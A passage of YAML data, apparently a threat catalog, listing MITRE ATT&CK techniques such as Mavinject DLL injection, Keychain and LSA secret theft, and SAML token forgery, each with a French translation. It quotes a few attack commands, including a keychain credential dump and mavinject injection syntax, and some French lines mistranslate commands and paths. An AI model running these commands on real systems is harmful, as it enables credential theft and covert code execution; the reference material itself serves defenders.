    ref_id: T1218.013
    name: Mavinject
    description: "Adversaries may abuse mavinject.exe to proxy execution of malicious\
      \ code. Mavinject.exe is the Microsoft Application Virtualization Injector,\
      \ a Windows utility that can inject code into external processes as part of\
      \ Microsoft Application Virtualization (App-V).(Citation: LOLBAS Mavinject)\n\
      \nAdversaries may abuse mavinject.exe to inject malicious DLLs into running\
      \ processes (i.e. [Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001)),\
      \ allowing for arbitrary code execution (ex. <code>C:\\Windows\\system32\\mavinject.exe\
      \ PID /INJECTRUNNING PATH_DLL</code>).(Citation: ATT Lazarus TTP Evolution)(Citation:\
      \ Reaqta Mavinject) Since mavinject.exe may be digitally signed by Microsoft,\
      \ proxying execution via this method may evade detection by security products\
      \ because the execution is masked under a legitimate process. \n\nIn addition\
      \ to [Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001),\
      \ Mavinject.exe can also be abused to perform import descriptor injection via\
      \ its  <code>/HMODULE</code> command-line parameter (ex. <code>mavinject.exe\
      \ PID /HMODULE=BASE_ADDRESS PATH_DLL ORDINAL_NUMBER</code>). This command would\
      \ inject an import table entry consisting of the specified DLL into the module\
      \ at the given base address.(Citation: Mavinject Functionality Deconstructed)\n\
      https://attack.mitre.org/techniques/T1218/013"
    translations:
      fr:
        name: Mavinject
        description: "Les adversaires peuvent abuser mavinject.exe pour ex\xE9cuter\
          \ par procuration de code malveillant. Mavinject.exe est le Microsoft Application\
          \ Virtualization Injector, un utilitaire Windows capable d'injecter du code\
          \ dans des processus externes dans le cadre de Microsoft Application Virtualization\
          \ (App-V). (Citation : LOLBAS Mavinject)\n\nLes adversaires peuvent abuser\
          \ de mavinject.exe pour injecter des DLL malveillants dans des processus\
          \ en cours (par exemple [Injection de biblioth\xE8que dynamique](https://attack.mitre.org/techniques/T1055/001)),\
          \ permettant une ex\xE9cution arbitraire de code (ex. <code>C\_:\\Windows\\\
          system32\\mavinject.exe PID /INJECTRUNNING PATH_DLL</code>). (Citation :\
          \ ATT Lazarus TTP \xC9volution)(Citation : Reaqta Mavinject) Puisque mavinject.exe\
          \ peuvent \xEAtre sign\xE9s num\xE9riquement par Microsoft, l'ex\xE9cution\
          \ par procuration via cette m\xE9thode peut \xE9chapper \xE0 la d\xE9tection\
          \ par les produits de s\xE9curit\xE9 car l'ex\xE9cution est masqu\xE9e par\
          \ un processus l\xE9gitime. \n\nEn plus de [Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001),\
          \ Mavinject.exe peut \xE9galement \xEAtre abus\xE9 pour effectuer l'injection\
          \ de descripteurs d'importation via son param\xE8tre de ligne de commande\
          \ <code>/HMODULE</code> (ex. <code>mavinject.exe PID /HMODULE=BASE_ADDRESS\
          \ PATH_DLL ORDINAL_NUMBER</code>). Cette commande injecterait une entr\xE9\
          e de table d'importation compos\xE9e de la DLL sp\xE9cifi\xE9e dans le module\
          \ \xE0 l'adresse de base donn\xE9e. (Citation : Fonctionnalit\xE9 Mavinject\
          \ D\xE9construite https://attack.mitre.org/techniques/T1218/013"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1074.001
    ref_id: T1074.001
    name: Local Data Staging
    description: 'Adversaries may stage collected data in a central location or directory
      on the local system prior to Exfiltration. Data may be kept in separate files
      or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560).
      Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106)
      and bash may be used to copy data into a staging location.


      Adversaries may also stage collected data in various available formats/locations
      of a system, including local storage databases/repositories or the Windows Registry.(Citation:
      Prevailion DarkWatchman 2021)

      https://attack.mitre.org/techniques/T1074/001'
    translations:
      fr:
        name: "Mise en sc\xE8ne locale des donn\xE9es"
        description: "Les adversaires peuvent placer les donn\xE9es collect\xE9es\
          \ dans un emplacement central ou un annuaire du syst\xE8me local avant l'Exfiltration.\
          \ Les donn\xE9es peuvent \xEAtre conserv\xE9es dans des fichiers s\xE9par\xE9\
          s ou combin\xE9es en un seul fichier gr\xE2ce \xE0 des techniques telles\
          \ que [Archive Collected Data](https://attack.mitre.org/techniques/T1560).\
          \ Des shells de commandes interactifs peuvent \xEAtre utilis\xE9s, et des\
          \ fonctionnalit\xE9s courantes dans [cmd](https://attack.mitre.org/software/S0106)\
          \ et bash peuvent \xEAtre utilis\xE9es pour copier les donn\xE9es dans un\
          \ emplacement de staging.\n\nLes adversaires peuvent \xE9galement organiser\
          \ les donn\xE9es collect\xE9es dans divers formats ou emplacements disponibles\
          \ d'un syst\xE8me, y compris des bases de donn\xE9es/d\xE9p\xF4ts de stockage\
          \ locaux ou le Registre Windows. (Citation : Prevailion DarkWatchman 2021)\
          \ https://attack.mitre.org/techniques/T1074/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1036.005
    ref_id: T1036.005
    name: Match Legitimate Resource Name or Location
    description: "Adversaries may match or approximate the name or location of legitimate\
      \ files, Registry keys, or other resources when naming/placing them. This is\
      \ done for the sake of evading defenses and observation. \n\nThis may be done\
      \ by placing an executable in a commonly trusted directory (ex: under System32)\
      \ or giving it the name of a legitimate, trusted program (ex: `svchost.exe`).\
      \ Alternatively, a Windows Registry key may be given a close approximation to\
      \ a key used by a legitimate program. In containerized environments, a threat\
      \ actor may create a resource in a trusted namespace or one that matches the\
      \ naming convention of a container pod or cluster.(Citation: Aquasec Kubernetes\
      \ Backdoor 2023)\nhttps://attack.mitre.org/techniques/T1036/005"
    translations:
      fr:
        name: "Correspondre au nom ou \xE0 la localisation l\xE9gitime de la ressource"
        description: "Les adversaires peuvent faire correspondre ou approcher le nom\
          \ ou l'emplacement de fichiers l\xE9gitimes, de cl\xE9s du Registre ou d'autres\
          \ ressources lors de leur nom/placement. Cela est fait pour \xE9chapper\
          \ aux d\xE9fenses et \xE0 l'observation. \n\nCela peut se faire en pla\xE7\
          ant un ex\xE9cutable dans un r\xE9pertoire commun\xE9ment fiable (ex : sous\
          \ System32) ou en lui donnant le nom d'un programme l\xE9gitime et de confiance\
          \ (ex : \xAB svchost.exe \xBB). Alternativement, une cl\xE9 du Registre\
          \ Windows peut recevoir une approximation proche d'une cl\xE9 utilis\xE9\
          e par un programme l\xE9gitime. Dans les environnements conteneuris\xE9\
          s, un acteur de menace peut cr\xE9er une ressource dans un espace de noms\
          \ de confiance ou une ressource correspondant \xE0 la convention de nommage\
          \ d'un pod ou d'un cluster conteneur. (Citation : Aquasec Kubernetes Backdoor\
          \ 2023)https://attack.mitre.org/techniques/T1036/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1587.003
    ref_id: T1587.003
    name: Digital Certificates
    description: 'Adversaries may create self-signed SSL/TLS certificates that can
      be used during targeting. SSL/TLS certificates are designed to instill trust.
      They include information about the key, information about its owner''s identity,
      and the digital signature of an entity that has verified the certificate''s
      contents are correct. If the signature is valid, and the person examining the
      certificate trusts the signer, then they know they can use that key to communicate
      with its owner. In the case of self-signing, digital certificates will lack
      the element of trust associated with the signature of a third-party certificate
      authority (CA).


      Adversaries may create self-signed SSL/TLS certificates that can be used to
      further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002)
      with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or even
      enabling [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)
      if added to the root of trust (i.e. [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004)).


      After creating a digital certificate, an adversary may then install that certificate
      (see [Install Digital Certificate](https://attack.mitre.org/techniques/T1608/003))
      on infrastructure under their control.

      https://attack.mitre.org/techniques/T1587/003'
    translations:
      fr:
        name: "Certificats num\xE9riques"
        description: "Les adversaires peuvent cr\xE9er des certificats SSL/TLS auto-sign\xE9\
          s qui peuvent \xEAtre utilis\xE9s lors du ciblage. Les certificats SSL/TLS\
          \ sont con\xE7us pour instaurer la confiance. Ils incluent des informations\
          \ sur la cl\xE9, des informations sur l'identit\xE9 de son propri\xE9taire,\
          \ ainsi que la signature num\xE9rique d'une entit\xE9 ayant v\xE9rifi\xE9\
          \ que le contenu du certificat est correct. Si la signature est valide et\
          \ que la personne qui examine le certificat fait confiance au signataire,\
          \ elle sait alors qu'elle peut utiliser cette cl\xE9 pour communiquer avec\
          \ son propri\xE9taire. Dans le cas de l'auto-signature, les certificats\
          \ num\xE9riques manqueront de l'\xE9l\xE9ment de confiance associ\xE9 \xE0\
          \ la signature d'une autorit\xE9 de certification tierce (CA).\n\nLes adversaires\
          \ peuvent cr\xE9er des certificats SSL/TLS auto-sign\xE9s qui peuvent \xEA\
          tre utilis\xE9s pour faire avancer leurs op\xE9rations, comme chiffrer le\
          \ trafic C2 (ex : [Cryptographie asym\xE9trique](https://attack.mitre.org/techniques/T1573/002)\
          \ avec [Protocoles Web](https://attack.mitre.org/techniques/T1071/001))\
          \ ou m\xEAme activer [Adversaire-in-the-Middle](https://attack.mitre.org/techniques/T1557)\
          \ s'ils sont ajout\xE9s \xE0 la racine de confiance (c'est-\xE0-dire [Installer\
          \ le certificat root](https://attack.mitre.org/techniques/T1553/004)).\n\
          \nApr\xE8s avoir cr\xE9\xE9 un certificat num\xE9rique, un adversaire peut\
          \ alors installer ce certificat (voir [Installer le certificat num\xE9rique](https://attack.mitre.org/techniques/T1608/003))\
          \ sur l'infrastructure sous son contr\xF4le.https\_://attack.mitre.org/techniques/T1587/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1565.001
    ref_id: T1565.001
    name: Stored Data Manipulation
    description: 'Adversaries may insert, delete, or manipulate data at rest in order
      to influence external outcomes or hide activity, thus threatening the integrity
      of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018)
      By manipulating stored data, adversaries may attempt to affect a business process,
      organizational understanding, and decision making.


      Stored data could include a variety of file formats, such as Office files, databases,
      stored emails, and custom file formats. The type of modification and the impact
      it will have depends on the type of data as well as the goals and objectives
      of the adversary. For complex systems, an adversary would likely need special
      expertise and possibly access to specialized software related to the system
      that would typically be gained through a prolonged information gathering campaign
      in order to have the desired impact.

      https://attack.mitre.org/techniques/T1565/001'
    translations:
      fr:
        name: "Manipulation des donn\xE9es stock\xE9es"
        description: "Les adversaires peuvent ins\xE9rer, supprimer ou manipuler des\
          \ donn\xE9es au repos afin d'influencer les r\xE9sultats externes ou de\
          \ dissimuler une activit\xE9, mena\xE7ant ainsi l'int\xE9grit\xE9 des donn\xE9\
          es. (Citation : FireEye APT38 oct. 2018)(Citation : DOJ Lazarus Sony 2018)\
          \ En manipulant les donn\xE9es stock\xE9es, les adversaires peuvent tenter\
          \ d'influencer un processus m\xE9tier, la compr\xE9hension organisationnelle\
          \ et la prise de d\xE9cision.\n\nLes donn\xE9es stock\xE9es peuvent inclure\
          \ une vari\xE9t\xE9 de formats de fichiers, tels que des fichiers Office,\
          \ des bases de donn\xE9es, des emails stock\xE9s et des formats de fichiers\
          \ personnalis\xE9s. Le type de modification et l'impact qu'elle aura d\xE9\
          pendent du type de donn\xE9es ainsi que des buts et objectifs de l'adversaire.\
          \ Pour les syst\xE8mes complexes, un adversaire aurait probablement besoin\
          \ d'une expertise particuli\xE8re et \xE9ventuellement d'un acc\xE8s \xE0\
          \ des logiciels sp\xE9cialis\xE9s li\xE9s au syst\xE8me, qui seraient g\xE9\
          n\xE9ralement obtenus via une campagne prolong\xE9e de collecte d'informations\
          \ afin d'obtenir l'impact d\xE9sir\xE9.https\_://attack.mitre.org/techniques/T1565/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1110.002
    ref_id: T1110.002
    name: Password Cracking
    description: "Adversaries may use password cracking to attempt to recover usable\
      \ credentials, such as plaintext passwords, when credential material such as\
      \ password hashes are obtained. [OS Credential Dumping](https://attack.mitre.org/techniques/T1003)\
      \ can be used to obtain password hashes, this may only get an adversary so far\
      \ when [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) is not\
      \ an option. Further,  adversaries may leverage [Data from Configuration Repository](https://attack.mitre.org/techniques/T1602)\
      \ in order to obtain hashed credentials for network devices.(Citation: US-CERT-TA18-106A)\
      \ \n\nTechniques to systematically guess the passwords used to compute hashes\
      \ are available, or the adversary may use a pre-computed rainbow table to crack\
      \ hashes. Cracking hashes is usually done on adversary-controlled systems outside\
      \ of the target network.(Citation: Wikipedia Password cracking) The resulting\
      \ plaintext password resulting from a successfully cracked hash may be used\
      \ to log into systems, resources, and services in which the account has access.\n\
      https://attack.mitre.org/techniques/T1110/002"
    translations:
      fr:
        name: Craquage des mots de passe
        description: "Les adversaires peuvent utiliser le craquement des mots de passe\
          \ pour tenter de r\xE9cup\xE9rer des identifiants utilisables, tels que\
          \ les mots de passe en clair, lorsque des documents de validation tels que\
          \ des hachages de mots de passe sont obtenus. [D\xE9versement des identifiants\
          \ OS](https://attack.mitre.org/techniques/T1003) peut \xEAtre utilis\xE9\
          \ pour obtenir des hachages de mot de passe, cela ne peut permettre \xE0\
          \ un adversaire de s'\xE9loigner que lorsque [Passer le hachage](https://attack.mitre.org/techniques/T1550/002)\
          \ n'est pas une option. De plus, les adversaires peuvent exploiter [Donn\xE9\
          es du D\xE9p\xF4t de Configuration](https://attack.mitre.org/techniques/T1602)\
          \ afin d'obtenir des identifiants hach\xE9s pour les appareils r\xE9seau.\
          \ (Citation : US-CERT-TA18-106A) \n\nDes techniques pour deviner syst\xE9\
          matiquement les mots de passe utilis\xE9s pour calculer les hachages sont\
          \ disponibles, ou l'adversaire peut utiliser une table arc-en-ciel pr\xE9\
          -calcul\xE9e pour craquer les hachages. Le cracking des hachages est g\xE9\
          n\xE9ralement r\xE9alis\xE9 sur des syst\xE8mes contr\xF4l\xE9s par l'adversaire\
          \ en dehors du r\xE9seau cible. (Citation : Cryptage de mots de passe Wikip\xE9\
          dia) Le mot de passe en clair r\xE9sultant d'un hachage r\xE9ussi peut \xEA\
          tre utilis\xE9 pour se connecter aux syst\xE8mes, ressources et services\
          \ auxquels le compte a acc\xE8s.https\_://attack.mitre.org/techniques/T1110/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1114.001
    ref_id: T1114.001
    name: Local Email Collection
    description: "Adversaries may target user email on local systems to collect sensitive\
      \ information. Files containing email data can be acquired from a user\u2019\
      s local system, such as Outlook storage or cache files.\n\nOutlook stores data\
      \ locally in offline data files with an extension of .ost. Outlook 2010 and\
      \ later supports .ost file sizes up to 50GB, while earlier versions of Outlook\
      \ support up to 20GB.(Citation: Outlook File Sizes) IMAP accounts in Outlook\
      \ 2013 (and earlier) and POP accounts use Outlook Data Files (.pst) as opposed\
      \ to .ost, whereas IMAP accounts in Outlook 2016 (and later) use .ost files.\
      \ Both types of Outlook data files are typically stored in `C:\\Users\\<username>\\\
      Documents\\Outlook Files` or `C:\\Users\\<username>\\AppData\\Local\\Microsoft\\\
      Outlook`.(Citation: Microsoft Outlook Files)\nhttps://attack.mitre.org/techniques/T1114/001"
    translations:
      fr:
        name: Collecte locale d'emails
        description: "Les adversaires peuvent cibler les e-mails des utilisateurs\
          \ sur les syst\xE8mes locaux pour collecter des informations sensibles.\
          \ Les fichiers contenant des donn\xE9es d'email peuvent \xEAtre obtenus\
          \ depuis le syst\xE8me local de l'utilisateur, comme le stockage Outlook\
          \ ou les fichiers cache.\n\nOutlook stocke les donn\xE9es localement dans\
          \ des fichiers hors ligne avec une extension .ost. Outlook 2010 et versions\
          \ ult\xE9rieures prennent en charge des formats .ost jusqu'\xE0 50 Go, tandis\
          \ que les versions ant\xE9rieures d'Outlook prennent en charge jusqu'\xE0\
          \ 20 Go. (Citation : Tailles de fichiers Outlook) Les comptes IMAP dans\
          \ Outlook 2013 (et les versions ant\xE9rieures) et POP utilisent les fichiers\
          \ de donn\xE9es Outlook (.pst) au lieu de .ost, tandis que les comptes IMAP\
          \ dans Outlook 2016 (et les versions ult\xE9rieures) utilisent des fichiers\
          \ .ost. Les deux types de fichiers de donn\xE9es Outlook sont g\xE9n\xE9\
          ralement stock\xE9s dans \xAB C\_:\\Users\\<nom d'utilisateur>\\Documents\\\
          Fichiers Outlook \xBB ou \xAB C\_:\\Users\\<nom d'utilisateur>\\AppData\\\
          Local\\Microsoft\\Outlook \xBB. (Citation : Fichiers Microsoft Outlook)https://attack.mitre.org/techniques/T1114/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1555.001
    ref_id: T1555.001
    name: Keychain
    description: "Adversaries may acquire credentials from Keychain. Keychain (or\
      \ Keychain Services) is the macOS credential management system that stores account\
      \ names, passwords, private keys, certificates, sensitive application data,\
      \ payment data, and secure notes. There are three types of Keychains: Login\
      \ Keychain, System Keychain, and Local Items (iCloud) Keychain. The default\
      \ Keychain is the Login Keychain, which stores user passwords and information.\
      \ The System Keychain stores items accessed by the operating system, such as\
      \ items shared among users on a host. The Local Items (iCloud) Keychain is used\
      \ for items synced with Apple\u2019s iCloud service. \n\nKeychains can be viewed\
      \ and edited through the Keychain Access application or using the command-line\
      \ utility <code>security</code>. Keychain files are located in <code>~/Library/Keychains/</code>,\
      \ <code>/Library/Keychains/</code>, and <code>/Network/Library/Keychains/</code>.(Citation:\
      \ Keychain Services Apple)(Citation: Keychain Decryption Passware)(Citation:\
      \ OSX Keychain Schaumann)\n\nAdversaries may gather user credentials from Keychain\
      \ storage/memory. For example, the command <code>security dump-keychain \u2013\
      d</code> will dump all Login Keychain credentials from <code>~/Library/Keychains/login.keychain-db</code>.\
      \ Adversaries may also directly read Login Keychain credentials from the <code>~/Library/Keychains/login.keychain</code>\
      \ file. Both methods require a password, where the default password for the\
      \ Login Keychain is the current user\u2019s password to login to the macOS host.(Citation:\
      \ External to DA, the OS X Way)(Citation: Empire Keychain Decrypt)\nhttps://attack.mitre.org/techniques/T1555/001"
    translations:
      fr:
        name: "Porte-cl\xE9s"
        description: "Les adversaires peuvent obtenir des accr\xE9ditations aupr\xE8\
          s de Keychain. Keychain (ou Keychain Services) est le syst\xE8me de gestion\
          \ des identifiants de macOS qui stocke les noms de compte, mots de passe,\
          \ cl\xE9s priv\xE9es, certificats, donn\xE9es sensibles de l'application,\
          \ donn\xE9es de paiement et notes s\xE9curis\xE9es. Il existe trois types\
          \ de porte-cl\xE9s : porte-cl\xE9s de connexion, porte-cl\xE9s syst\xE8\
          me et porte-cl\xE9s des objets locaux (iCloud). Le porte-cl\xE9s par d\xE9\
          faut est le Connection, qui stocke les mots de passe et informations des\
          \ utilisateurs. Le Trousseau Syst\xE8me stocke les \xE9l\xE9ments accessibles\
          \ par le syst\xE8me d'exploitation, tels que les \xE9l\xE9ments partag\xE9\
          s entre les utilisateurs sur un h\xF4te. Le porte-cl\xE9s Local Items (iCloud)\
          \ est utilis\xE9 pour les \xE9l\xE9ments synchronis\xE9s avec le service\
          \ iCloud d'Apple. \n\nLes porte-cl\xE9s peuvent \xEAtre consult\xE9s et\
          \ modifi\xE9s via l'application Keychain Access ou via l'utilitaire en ligne\
          \ de commande <code>security</code>. Les fichiers porte-cl\xE9s se trouvent\
          \ dans <code>~/Biblioth\xE8que/Porte-cl\xE9s/</code>, <code>/Biblioth\xE8\
          que/Porte-cl\xE9s/</code>, et <code>/R\xE9seau/Biblioth\xE8que/Porte-cl\xE9\
          s/</code>. (Citation : Porte-cl\xE9s Apple)(Citation : Passware de d\xE9\
          cryptage de porte-cl\xE9s)(Citation : Porte-cl\xE9s OSX Schaumann)\n\nLes\
          \ adversaires peuvent recueillir des identifiants utilisateur \xE0 partir\
          \ du stockage ou de la m\xE9moire du porte-cl\xE9s. Par exemple, la commande\
          \ <code>security-dump-keychain \u2013d</code> d\xE9vertera tous les identifiants\
          \ du porte-cl\xE9s de connexion de <code>~/Library/Keychains/login.keychain-db</code>.\
          \ Les adversaires peuvent \xE9galement lire directement les identifiants\
          \ Login Keychain \xE0 partir du fichier <code>~/Library/Keychains/login.keychain</code>.\
          \ Les deux m\xE9thodes n\xE9cessitent un mot de passe, o\xF9 le mot de passe\
          \ par d\xE9faut pour le porte-cl\xE9s de connexion est celui de l'utilisateur\
          \ actuel pour se connecter \xE0 l'h\xF4te macOS. (Citation : Externe \xE0\
          \ DA, \xE0 la mani\xE8re OS X)(Citation : D\xE9cryptage du porte-cl\xE9\
          s de l'Empire)https://attack.mitre.org/techniques/T1555/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1547
    ref_id: T1547
    name: Boot or Logon Autostart Execution
    description: 'Adversaries may configure system settings to automatically execute
      a program during system boot or logon to maintain persistence or gain higher-level
      privileges on compromised systems. Operating systems may have mechanisms for
      automatically running a program on system boot or account logon.(Citation: Microsoft
      Run Key)(Citation: MSDN Authentication Packages)(Citation: Microsoft TimeProvider)(Citation:
      Cylance Reg Persistence Sept 2013)(Citation: Linux Kernel Programming) These
      mechanisms may include automatically executing programs that are placed in specially
      designated directories or are referenced by repositories that store configuration
      information, such as the Windows Registry. An adversary may achieve the same
      goal by modifying or extending features of the kernel.


      Since some boot or logon autostart programs run with higher privileges, an adversary
      may leverage these to elevate privileges.

      https://attack.mitre.org/techniques/T1547'
    translations:
      fr:
        name: "D\xE9marrage automatique du d\xE9marrage ou de la connexion"
        description: "Les adversaires peuvent configurer les param\xE8tres syst\xE8\
          me pour ex\xE9cuter automatiquement un programme lors du d\xE9marrage ou\
          \ de la connexion afin de maintenir la persistance ou d'obtenir des privil\xE8\
          ges de niveau sup\xE9rieur sur les syst\xE8mes compromis. Les syst\xE8mes\
          \ d'exploitation peuvent disposer de m\xE9canismes permettant d'ex\xE9cuter\
          \ automatiquement un programme au d\xE9marrage du syst\xE8me ou \xE0 la\
          \ connexion du compte. (Citation : Microsoft Run Key)(Citation : Paquets\
          \ d'authentification MSDN)(Citation : Microsoft TimeProvider)(Citation :\
          \ Cylance Reg Persistence sept. 2013)(Citation : Programmation du noyau\
          \ Linux) Ces m\xE9canismes peuvent inclure l'ex\xE9cution automatique de\
          \ programmes plac\xE9s dans des r\xE9pertoires sp\xE9cialement d\xE9sign\xE9\
          s ou r\xE9f\xE9renc\xE9s par des d\xE9p\xF4ts stockant des informations\
          \ de configuration, tels que le Registre Windows. Un adversaire peut atteindre\
          \ le m\xEAme objectif en modifiant ou en \xE9tendant des caract\xE9ristiques\
          \ du noyau.\n\nPuisque certains programmes de d\xE9marrage automatique ou\
          \ de connexion fonctionnent avec des privil\xE8ges plus \xE9lev\xE9s, un\
          \ adversaire peut en tirer parti pour augmenter les privil\xE8ges.https\_\
          ://attack.mitre.org/techniques/T1547"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1003.004
    ref_id: T1003.004
    name: LSA Secrets
    description: 'Adversaries with SYSTEM access to a host may attempt to access Local
      Security Authority (LSA) secrets, which can contain a variety of different credential
      materials, such as credentials for service accounts.(Citation: Passcape LSA
      Secrets)(Citation: Microsoft AD Admin Tier Model)(Citation: Tilbury Windows
      Credentials) LSA secrets are stored in the registry at <code>HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets</code>.
      LSA secrets can also be dumped from memory.(Citation: ired Dumping LSA Secrets)


      [Reg](https://attack.mitre.org/software/S0075) can be used to extract from the
      Registry. [Mimikatz](https://attack.mitre.org/software/S0002) can be used to
      extract secrets from memory.(Citation: ired Dumping LSA Secrets)

      https://attack.mitre.org/techniques/T1003/004'
    translations:
      fr:
        name: LSA Secrets
        description: "Les adversaires ayant acc\xE8s au SYST\xC8ME \xE0 un h\xF4te\
          \ peuvent tenter d'acc\xE9der aux secrets de la Local Security Authority\
          \ (LSA), qui peuvent contenir divers documents d'accr\xE9ditation, tels\
          \ que des identifiants pour des comptes de service. (Citation : Secrets\
          \ LSA de Passcape)(Citation : Mod\xE8le de niveau d'administration Microsoft\
          \ AD)(Citation : Identifiants Windows Tilbury) Les secrets LSA sont stock\xE9\
          s dans le registre \xE0 <code>HKEY_LOCAL_MACHINE\\SECURITY\\Policy\\Secrets</code>.\
          \ Les secrets LSA peuvent aussi \xEAtre extraits de m\xE9moire. (Citation\
          \ : ired Dumping LSA Secrets)\n\n[Reg](https://attack.mitre.org/software/S0075)\
          \ peut \xEAtre utilis\xE9 pour extraire du Registre. [Mimikatz](https://attack.mitre.org/software/S0002)\
          \ peut \xEAtre utilis\xE9 pour extraire des secrets de la m\xE9moire. (Citation\
          \ : ired Dumping LSA Secrets) https://attack.mitre.org/techniques/T1003/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1600
    ref_id: T1600
    name: Weaken Encryption
    description: "Adversaries may compromise a network device\u2019s encryption capability\
      \ in order to bypass encryption that would otherwise protect data communications.\
      \ (Citation: Cisco Synful Knock Evolution)\n\nEncryption can be used to protect\
      \ transmitted network traffic to maintain its confidentiality (protect against\
      \ unauthorized disclosure) and integrity (protect against unauthorized changes).\
      \ Encryption ciphers are used to convert a plaintext message to ciphertext and\
      \ can be computationally intensive to decipher without the associated decryption\
      \ key. Typically, longer keys increase the cost of cryptanalysis, or decryption\
      \ without the key.\n\nAdversaries can compromise and manipulate devices that\
      \ perform encryption of network traffic. For example, through behaviors such\
      \ as [Modify System Image](https://attack.mitre.org/techniques/T1601), [Reduce\
      \ Key Space](https://attack.mitre.org/techniques/T1600/001), and [Disable Crypto\
      \ Hardware](https://attack.mitre.org/techniques/T1600/002), an adversary can\
      \ negatively effect and/or eliminate a device\u2019s ability to securely encrypt\
      \ network traffic. This poses a greater risk of unauthorized disclosure and\
      \ may help facilitate data manipulation, Credential Access, or Collection efforts.\
      \ (Citation: Cisco Blog Legacy Device Attacks)\nhttps://attack.mitre.org/techniques/T1600"
    translations:
      fr:
        name: Affaiblir le chiffrement
        description: "Les adversaires peuvent compromettre la capacit\xE9 de chiffrement\
          \ d'un dispositif r\xE9seau afin de contourner un chiffrement qui prot\xE9\
          gerait autrement les communications de donn\xE9es. (Citation : Cisco Synful\
          \ Knock Evolution)\n\nLe chiffrement peut \xEAtre utilis\xE9 pour prot\xE9\
          ger le trafic r\xE9seau transmis afin de pr\xE9server sa confidentialit\xE9\
          \ (protection contre la divulgation non autoris\xE9e) et son int\xE9grit\xE9\
          \ (protection contre les modifications non autoris\xE9es). Les chiffres\
          \ de chiffrement sont utilis\xE9s pour convertir un message en texte clair\
          \ en texte chiffr\xE9 et peuvent \xEAtre tr\xE8s gourmands en calcul \xE0\
          \ d\xE9chiffrer sans la cl\xE9 de d\xE9chiffrement associ\xE9e. En g\xE9\
          n\xE9ral, des cl\xE9s plus longues augmentent le co\xFBt de la cryptanalyse,\
          \ ou du d\xE9chiffrement sans la cl\xE9.\n\nLes adversaires peuvent compromettre\
          \ et manipuler les appareils qui r\xE9alisent le chiffrement du trafic r\xE9\
          seau. Par exemple, par des comportements tels que [Modifier l'image syst\xE8\
          me](https://attack.mitre.org/techniques/T1601), [R\xE9duire l'espace de\
          \ cl\xE9s](https://attack.mitre.org/techniques/T1600/001) et [D\xE9sactiver\
          \ le mat\xE9riel crypto](https://attack.mitre.org/techniques/T1600/002),\
          \ un adversaire peut nuire et/ou \xE9liminer la capacit\xE9 d'un appareil\
          \ \xE0 chiffrer le trafic r\xE9seau en toute s\xE9curit\xE9. Cela pr\xE9\
          sente un risque accru de divulgation non autoris\xE9e et peut faciliter\
          \ la manipulation des donn\xE9es, l'acc\xE8s aux accr\xE9ditations ou les\
          \ efforts de collecte. (Citation : Attaques de p\xE9riph\xE9riques h\xE9\
          rit\xE9s du blog Cisco)https://attack.mitre.org/techniques/T1600"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1606.002
    ref_id: T1606.002
    name: SAML Tokens
    description: 'An adversary may forge SAML tokens with any permissions claims and
      lifetimes if they possess a valid SAML token-signing certificate.(Citation:
      Microsoft SolarWinds Steps) The default lifetime of a SAML token is one hour,
      but the validity period can be specified in the <code>NotOnOrAfter</code> value
      of the <code>conditions ...</code> element in a token. This value can be changed
      using the <code>AccessTokenLifetime</code> in a <code>LifetimeTokenPolicy</code>.(Citation:
      Microsoft SAML Token Lifetimes) Forged SAML tokens enable adversaries to authenticate
      across services that use SAML 2.0 as an SSO (single sign-on) mechanism.(Citation:
      Cyberark Golden SAML)


      An adversary may utilize [Private Keys](https://attack.mitre.org/techniques/T1552/004)
      to compromise an organization''s token-signing certificate to create forged
      SAML tokens. If the adversary has sufficient permissions to establish a new
      federation trust with their own Active Directory Federation Services (AD FS)
      server, they may instead generate their own trusted token-signing certificate.(Citation:
      Microsoft SolarWinds Customer Guidance) This differs from [Steal Application
      Access Token](https://attack.mitre.org/techniques/T1528) and other similar behaviors
      in that the tokens are new and forged by the adversary, rather than stolen or
      intercepted from legitimate users.


      An adversary may gain administrative Entra ID privileges if a SAML token is
      forged which claims to represent a highly privileged account. This may lead
      to [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550),
      which may bypass multi-factor and other authentication protection mechanisms.(Citation:
      Microsoft SolarWinds Customer Guidance)

      https://attack.mitre.org/techniques/T1606/002'
    translations:
      fr:
        name: Jetons SAML
        description: "Un adversaire peut falsifier des jetons SAML avec toutes les\
          \ permissions, revendications et dur\xE9es de vie s'il poss\xE8de un certificat\
          \ de signature de jeton SAML valide. (Citation : \xC9tapes Microsoft SolarWinds)\
          \ La dur\xE9e de vie par d\xE9faut d'un jeton SAML est d'une heure, mais\
          \ la p\xE9riode de validit\xE9 peut \xEAtre sp\xE9cifi\xE9e dans la valeur\
          \ <code>NotOnOrAfter</code> des conditions <code> ... </code> \xE9l\xE9\
          ment dans un jeton. Cette valeur peut \xEAtre modifi\xE9e en utilisant le\
          \ <code>AccessTokenLifetime</code> dans un <code>LifetimeTokenPolicy</code>.\
          \ (Citation : Dur\xE9e de vie des jetons Microsoft SAML) Les jetons SAML\
          \ falsifi\xE9s permettent aux adversaires de s'authentifier entre des services\
          \ utilisant SAML 2.0 comme m\xE9canisme SSO (connexion unique). (Citation\
